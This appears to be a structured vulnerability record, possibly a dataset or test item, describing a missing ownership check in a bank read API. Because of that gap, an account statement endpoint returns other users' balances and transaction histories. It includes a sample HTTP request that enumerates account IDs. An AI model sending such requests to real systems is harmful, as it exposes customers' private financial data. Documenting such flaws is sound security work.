diagnosis: The query handler reads an account statement projection from Elasticsearch by accountId without checking if req.user.id owns the bank account. An attacker can enumerate account numbers to retrieve account balances, statement summaries, and transaction histories.
exploit_request:
GET /api/projections/bank-accounts/acc_891028301/statement HTTP/1.1
Host: read-api.onlinebank.com
Authorization: Bearer <user_token>
